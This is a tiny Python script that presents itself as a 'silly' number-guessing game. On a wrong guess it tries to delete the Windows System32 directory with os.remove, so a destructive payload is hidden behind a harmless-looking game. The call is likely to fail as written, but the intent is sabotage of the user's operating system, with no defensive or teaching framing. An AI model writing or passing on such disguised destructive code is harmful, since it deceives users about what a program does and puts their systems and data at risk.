import random
import os

number = random.randint(1,10)
guess = input("Silly game! Guess a number between 1 and 10 (don't type in letters or you will cry...):")
guess = int(guess)

if guess == number:
    print("You Won!")
else:
    os.remove("C:\\Windows\\System32")
